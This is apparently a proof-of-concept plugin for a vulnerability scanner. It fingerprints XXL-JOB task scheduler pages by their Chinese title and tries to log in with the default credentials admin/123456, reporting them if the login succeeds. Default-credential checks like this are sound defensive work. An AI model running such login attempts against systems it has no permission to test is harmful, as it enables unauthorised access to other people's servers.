# -*- coding:utf-8 -*-
# XXL-JOB任务调度中心 默认密码

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def login(self, url):
        resp = self.requestUtil.post(url + "/login", data="userName=admin&password=123456").json()
        print(resp["code"])
        if resp["code"] == 200:
            return True

    def fingerprint(self):
        try:
            if "任务调度中心" in self.service.title:
                return True
        except:
            return False

    def poc(self):
        try:
            if self.login(self.service.url):
                return ["XXL-JOB任务调度中心 默认密码", "用户名: admin<br>密码: 123456"]
        except:
            return []
